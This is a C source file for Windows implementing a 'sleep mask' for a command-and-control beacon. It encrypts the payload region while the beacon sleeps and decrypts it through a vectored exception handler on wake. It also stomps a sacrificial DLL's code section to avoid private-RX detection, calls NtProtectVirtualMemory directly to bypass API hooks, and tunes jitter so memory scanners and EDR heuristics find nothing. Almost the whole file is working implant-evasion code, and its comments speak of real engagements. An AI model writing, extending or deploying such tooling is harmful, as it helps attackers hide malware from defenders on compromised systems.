// x86_64-w64-mingw32-gcc -Wall -Wextra -o hermit-sleep.exe hermit.c
//
// hermit_sleep: a CET-native sleep mask.
//
// Ekko, Cronos, FOLIAGE, SleepyCrypt all stomp the stack to drive the
// encrypt/sleep/decrypt sequence: ROP chains, crafted returns, fibers,
// NtContinue, unwinder spoofing. CET shadow stacks (24H2, on capable HW,
// for CETCompat binaries or under system mitigation) cross-check the
// return on the regular stack against the one the CPU pushed, which
// breaks or at least complicates every one of those tricks.
//
// hermit doesn't fight it. The beacon ret's out of the masked region
// before it sleeps, so the stack is clean for real: nothing to spoof,
// nothing to reconcile, every `call` into the region balanced by a
// `ret`. The contract is one line:
//
//     call in -> ret out -> signal cold -> sleep
//
// Honor it. A non-returning payload calls once and wedges; the masker
// never fires and the VEH never runs. The demo payload below is a bare
// `0xC3`; real shellcode has to return after each work tick too.
//
// All that's left to hide is the region's memory. A dedicated masker XORs
// it for the whole sleep, and the first call after waking faults into a
// VEH that decrypts and resumes. The fault lands after the call pushed its
// return onto both stacks, so the retried instruction is the decrypted
// `ret` and the pair balances. No ROP, no NtContinue, no shadow-stack
// reconciliation.
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>

// ---- behavioral churn knobs ------------------------------------------------
// With the static IOCs gone, detection falls back to correlating
// VirtualProtect / fault churn. These knobs deny it the features it
// needs: periodicity (jitter), frequency (min_sleep, coverage), and a
// fixed telemetry shape (mode, wake_on_demand).
enum { MASK_FLIP, MASK_DECOMMIT };
typedef struct {
    DWORD sleep_ms;        // base beacon sleep
    DWORD jitter_ms;       // actual sleep = base + prng % jitter
    DWORD min_sleep_ms;    // never mask a sleep shorter than this
    int   coverage_n;      // mask every Nth sleep (1 = every sleep)
    int   mode;            // MASK_FLIP (VirtualProtect) | MASK_DECOMMIT (release VAD)
    int   wake_on_demand;  // 1 = VEH decrypts on touch | 0 = scheduled
} mask_cfg;
static mask_cfg g_cfg;

// ---- tiny PRNG -------------------------------------------------------------
// Feeds per-cycle rekeying and sleep jitter. One state per consumer
// so threads never share it. (Real build: swap for a CSPRNG.)
static unsigned prng(unsigned long long *s) {
    *s ^= *s << 13; *s ^= *s >> 7; *s ^= *s << 17;
    return (unsigned)*s;
}
static unsigned long long g_prng_key, g_prng_jit;

// ---- region descriptor -----------------------------------------------------
// Metadata (base, length, key) is NOT in .data: plain globals let a
// scanner disassemble the VEH and recover the masked range. We keep
// the descriptor on the heap and the global holds (pointer ^ cookie),
// so the pointer isn't scannable at rest.
typedef struct {
    unsigned char *base;
    size_t         len;
    unsigned char  key[16];   // current cycle's key — valid ONLY while masked
    unsigned char *staging;   // decommit mode: ciphertext lives here, pages freed
    int            owns_pages;// 0 = stomped image pages, 1 = our VirtualAlloc
} region_desc;
static unsigned long long g_desc_obf;   // (region_desc *) ^ g_cookie
static unsigned long long g_cookie;
#define DESC() ((region_desc *)(g_desc_obf ^ g_cookie))

static volatile LONG  g_state = 0;      // 0=plain+RX 1=masked 2=decrypting 3=masking
static volatile DWORD g_sleep_actual;   // beacon publishes its jittered sleep
static HANDLE         g_evt_sleep;      // beacon -> masker: "cold, sleeping"

// ---- VirtualProtect, below the kernel32/kernelbase hook layers -------------
// VirtualProtect walks kernel32 -> kernelbase -> ntdll; every layer is
// a hook point. We resolve the native entry once and call it directly.
// (Real build: direct syscall stubs to also bypass ntdll's user-mode
// hooks.)
typedef LONG (NTAPI *NtProtect_t)(HANDLE, PVOID *, SIZE_T *, ULONG, ULONG *);
static NtProtect_t pNtProtectVirtualMemory;
static void vp(void *base, size_t len, DWORD prot) {
    PVOID b = base; SIZE_T n = len; ULONG old;
    if (pNtProtectVirtualMemory)
        pNtProtectVirtualMemory(GetCurrentProcess(), &b, &n, prot, &old);
    else
        VirtualProtect(base, len, prot, &old);  // resolve failed: hooks exposed
}

// ---- per-cycle rekey -------------------------------------------------------
// A static key means identical ciphertext every cycle: recoverable via
// known-plaintext, diffable across memory snapshots. Fresh key per
// cycle, stored in the descriptor ONLY while masked, zeroed by decrypt.
static void make_key(unsigned char out[16]) {
    for (int i = 0; i < 16; i += 4) {
        unsigned r = prng(&g_prng_key);
        memcpy(out + i, &r, 4);
    }
}
static void xor_region(region_desc *d) {
    for (size_t i = 0; i < d->len; i++) d->base[i] ^= d->key[i % 16];
}

// ---- the ONE decrypt path --------------------------------------------------
// Called by the VEH (on-demand wake) and by the masker (scheduled
// wake). Invariant: only the thread that wins the CAS to state=2
// touches protections or content, and it restores RX itself — nobody
// else may.
static void decrypt(region_desc *d) {
    if (d->owns_pages && g_cfg.mode == MASK_DECOMMIT) {
        VirtualAlloc(d->base, d->len, MEM_COMMIT, PAGE_READWRITE); // recommit
        memcpy(d->base, d->staging, d->len);
    } else {
        vp(d->base, d->len, PAGE_READWRITE);
    }
    xor_region(d);                                // ciphertext -> plain
    SecureZeroMemory(d->key, sizeof d->key);      // key dies with the mask
    vp(d->base, d->len, PAGE_EXECUTE_READ);
    InterlockedExchange(&g_state, 0);
}

// ---- the mask path ---------------------------------------------------------
// State is published BEFORE the page becomes non-executable, so the
// VEH never sees "state==0 but page already RW" — the race that would
// spin a faulting thread in a tight loop until the mask finishes.
static void mask(region_desc *d) {
    make_key(d->key);                             // fresh key per cycle
    InterlockedExchange(&g_state, 3);             // publish mask-in-flight FIRST
    if (d->owns_pages && g_cfg.mode == MASK_DECOMMIT) {
        // Decommit mode: stash ciphertext, RELEASE the pages — the range
        // shows reserved, nothing to read. Trades VirtualProtect churn
        // for VAD churn. Image pages can't be decommitted, hence owns_pages.
        vp(d->base, d->len, PAGE_READWRITE);
        xor_region(d);
        memcpy(d->staging, d->base, d->len);
        VirtualFree(d->base, d->len, MEM_DECOMMIT);
    } else {
        vp(d->base, d->len, PAGE_READWRITE);      // ciphertext at rest is RW:
        xor_region(d);                            // non-executable under DEP
    }
    InterlockedExchange(&g_state, 1);
}

// ---- VEH: transparent wake (the CET-safety piece) ----------------------
// The wake `call` pushes its return onto both the regular and shadow
// stacks, then faults trying to execute from a non-executable page. We
// decrypt here on the faulting thread and return CONTINUE_EXECUTION; the
// CPU retries the now-decrypted `ret`, which pops both stacks and matches
// — same `call`, same return address, nothing to reconcile.
//
// Kept thin on purpose: no strings, no IO, no CRT. The VEH chain is
// enumerable, and a chatty handler is its own signature.
LONG CALLBACK veh(PEXCEPTION_POINTERS ei) {
    if (ei->ExceptionRecord->ExceptionCode != EXCEPTION_ACCESS_VIOLATION)
        return EXCEPTION_CONTINUE_SEARCH;
    region_desc *d = DESC();
    unsigned char *addr = (unsigned char *)ei->ExceptionRecord->ExceptionInformation[1];
    if (addr < d->base || addr >= d->base + d->len)
        return EXCEPTION_CONTINUE_SEARCH;         // not ours

    // Four states, CAS-observed; we wait here rather than re-faulting, since
    // exception storms are their own heuristic:
    //   0 plain RX     — nothing to do (write faults can't recover: SEARCH)
    //   1 masked       — own the decrypt via CAS 1->2
    //   2 decrypting   — someone else owns it; wait
    //   3 masking      — mask in flight; wait for it to finish
    for (;;) {
        LONG s = InterlockedCompareExchange(&g_state, 0, 0);
        if (s == 1) {
            if (InterlockedCompareExchange(&g_state, 2, 1) == 1) {
                decrypt(d);
                return EXCEPTION_CONTINUE_EXECUTION;  // re-execute faulting insn
            }
            continue;                                 // CAS lost, re-observe
        }
        if (s == 0) {
            // Write to plain RX can never succeed — crash loudly rather
            // than re-fault forever.
            if (ei->ExceptionRecord->ExceptionInformation[0] == 1)
                return EXCEPTION_CONTINUE_SEARCH;
            return EXCEPTION_CONTINUE_EXECUTION;      // decrypt landed: plain + RX
        }
        Sleep(0);                                     // s == 2 or 3: yield
    }
}

// ---- Masker: dedicated, event-driven ---------------------------------------
// One iteration per beacon sleep; no timer queue, no periodic callbacks
// for ETW to attribute. The beacon is never suspended: the contract puts
// it OUT of the region before g_evt_sleep fires, so the lockstep is free.
// It can't signal the next sleep until its call returns, and its call
// can't return until any decrypt it triggered has finished.
DWORD WINAPI masker(LPVOID a) {
    (void)a;
    region_desc *d = DESC();
    LONG cycle = 0;
    for (;;) {
        WaitForSingleObject(g_evt_sleep, INFINITE);          // beacon went cold
        LONG c = InterlockedIncrement(&cycle);               // every sleep counts
        if (g_sleep_actual >= g_cfg.min_sleep_ms              // too short to mask
            && c % g_cfg.coverage_n == 0) {                   // coverage sampling
            mask(d);
            printf("[mask]   cycle %ld masked (%s) for %ums\n", c,
                   g_cfg.mode == MASK_DECOMMIT ? "decommit" : "flip",
                   (unsigned)g_sleep_actual);
            if (!g_cfg.wake_on_demand) {                      // scheduled wake:
                Sleep(g_sleep_actual > 100 ? g_sleep_actual - 100 : 0); // wake ~100ms
                // Decrypt BEFORE the beacon wakes. CAS 1->2 still coordinates
                // with the VEH in case the beacon races ahead of the margin.
                if (InterlockedCompareExchange(&g_state, 2, 1) == 1)
                    decrypt(d);
            }
            // On wake_on_demand, the VEH owns the decrypt path.
        } else {
            printf("[mask]   cycle %ld skipped (knobs)\n", c);
        }
    }
    return 0;
}

// ---- Beacon: the cooperative contract --------------------------------------
// call in -> ret out -> signal cold -> sleep.
//
// While it's in Sleep(): no frame on this thread points into the region,
// RIP is in ntdll inside the syscall, and nothing was unwound or spoofed;
// the stack is clean, which is the whole point. The shadow stack has no
// mismatch to object to because we never produced one.
DWORD WINAPI beacon(LPVOID a) {
    (void)a;
    region_desc *d = DESC();
    for (;;) {
        ((void(*)(void))d->base)();             // work IN the region, then ret out
        DWORD ms = g_cfg.sleep_ms +
                   (g_cfg.jitter_ms ? prng(&g_prng_jit) % g_cfg.jitter_ms : 0);
        g_sleep_actual = ms;
        printf("[beacon] call ok, sleeping %ums\n", (unsigned)ms);
        SetEvent(g_evt_sleep);                  // cold: the masker may run
        Sleep(ms);                              // masked for the WHOLE sleep
        // On wake, the loop's call is the wake touch. If still masked,
        // the VEH silently decrypts first — no print there, transparent
        // is the point.
    }
    return 0;
}

// ---- Scanner (DEMO ONLY) ---------------------------------------------------
// Stand-in for a memory scanner: reads the region every 50ms through
// the ordinary API. Reads don't fault — during every masked sleep it
// sees CIPHERTEXT (or nothing, in decommit mode) and NEVER triggers a
// decrypt. This makes the full-sleep coverage visible on screen. Real
// engagements ship without this thread.
DWORD WINAPI scanner(LPVOID a) {
    (void)a;
    region_desc *d = DESC();
    int last = -2;
    for (;;) {
        unsigned char b = 0; SIZE_T got = 0;
        ReadProcessMemory(GetCurrentProcess(), d->base, &b, 1, &got);
        int cur = got ? b : -1;
        if (cur != last) {
            if (!got) printf("[scan]   region unreadable (decommitted)\n");
            else      printf("[scan]   reads %#04x (%s)\n", b,
                             g_state ? "ciphertext" : "plaintext");
            last = cur;
        }
        Sleep(50);
    }
    return 0;
}

// ---- module stomping (simplified) ------------------------------------------
// A plain VirtualAlloc'd private-RX region IS the scanner IOC —
// Moneta/pe-sieve flag exactly that. Instead: load a sacrificial
// legitimate DLL that nothing in this process calls, and take over
// its .text. The region is now image-backed, so the standard
// private-RX heuristic doesn't fire. (Real build: target DLL from
// config, use slack space so no original bytes are overwritten,
// restore on exit.)
static int stomp(region_desc *d, const unsigned char *sc, size_t sc_len) {
    HMODULE m = LoadLibraryA("xpsservices.dll");    // rarely already loaded
    if (!m) return 0;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)m;
    IMAGE_NT_HEADERS *nt  = (IMAGE_NT_HEADERS *)((BYTE *)m + dos->e_lfanew);
    IMAGE_SECTION_HEADER *s = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++, s++) {
        if (!(s->Characteristics & IMAGE_SCN_CNT_CODE)) continue;
        if (s->Misc.VirtualSize < sc_len) continue;   // too small — try next section
        d->base = (unsigned char *)m + s->VirtualAddress;
        d->len  = sc_len;                             // stomp only what we need
        d->owns_pages = 0;                            // image pages: no decommit
        vp(d->base, d->len, PAGE_READWRITE);
        memcpy(d->base, sc, sc_len);
        vp(d->base, d->len, PAGE_EXECUTE_READ);
        return 1;
    }
    return 0;
}

int main(void) {
    unsigned char sc[] = { 0xC3 };                  // stand-in payload: plain `ret`
    // CET shadow-stack-safe by construction (the wake fault is a balanced
    // call/ret). Enforcement needs capable HW plus a CETCompat LoadConfig
    // bit, or system-wide mitigation; see the header. IBT is orthogonal:
    // if it's in scope, prefix indirect-call targets with endbr64
    // (f3 0f 1e fa).

    // ---- the churn knobs ----
    g_cfg.sleep_ms       = 2000;
    g_cfg.jitter_ms      = 1500;                    // sleeps land in 2.0-3.5s
    g_cfg.min_sleep_ms   = 1000;
    g_cfg.coverage_n     = 1;
    g_cfg.mode           = MASK_FLIP;
    g_cfg.wake_on_demand = 1;
    if (g_cfg.coverage_n < 1) g_cfg.coverage_n = 1; // div-by-zero guard

    // Heap descriptor, mangled pointer — BEFORE anything can fault
    g_prng_jit = GetTickCount() ^ ((unsigned long long)GetCurrentProcessId() << 32);
    g_prng_key = g_prng_jit ^ 0x9e3779b97f4a7c15ULL;
    g_cookie   = ((unsigned long long)prng(&g_prng_jit) << 32) | prng(&g_prng_jit);
    region_desc *d = calloc(1, sizeof *d);
    g_desc_obf = (unsigned long long)d ^ g_cookie;

    // Resolve the native entry point once, before the region exists
    pNtProtectVirtualMemory = (NtProtect_t)(void *)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtProtectVirtualMemory");

    // Stomp first; fall back to private-RX only so the demo always runs
    // (the fallback is visibly the IOC we're trying NOT to be).
    if (!stomp(d, sc, sizeof sc)) {
        printf("[setup]  stomp failed — private-RX fallback (the IOC we're trying to avoid)\n");
        d->base = VirtualAlloc(NULL, sizeof sc, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        memcpy(d->base, sc, sizeof sc);
        d->len  = sizeof sc;
        d->owns_pages = 1;
        vp(d->base, d->len, PAGE_EXECUTE_READ);
    }
    memset(sc, 0, sizeof sc);                       // zero the ORIGINAL: no dual copy
    if (!d->owns_pages && g_cfg.mode == MASK_DECOMMIT)
        g_cfg.mode = MASK_FLIP;                     // can't decommit image pages
    if (g_cfg.mode == MASK_DECOMMIT)
        d->staging = malloc(d->len);

    printf("[setup]  region %p (%llu bytes, %s), wake %s\n", (void *)d->base,
           (unsigned long long)d->len, d->owns_pages ? "private" : "image-backed",
           g_cfg.wake_on_demand ? "on-demand (VEH)" : "scheduled");

    // Thin VEH, registered LAST — only after metadata is fully published
    AddVectoredExceptionHandler(1, veh);

    g_evt_sleep = CreateEvent(NULL, FALSE, FALSE, NULL);  // auto-reset
    CreateThread(NULL, 0, masker,  NULL, 0, NULL);
    CreateThread(NULL, 0, scanner, NULL, 0, NULL);        // demo only
    CreateThread(NULL, 0, beacon,  NULL, 0, NULL);

    Sleep(20000);
    return 0;
}
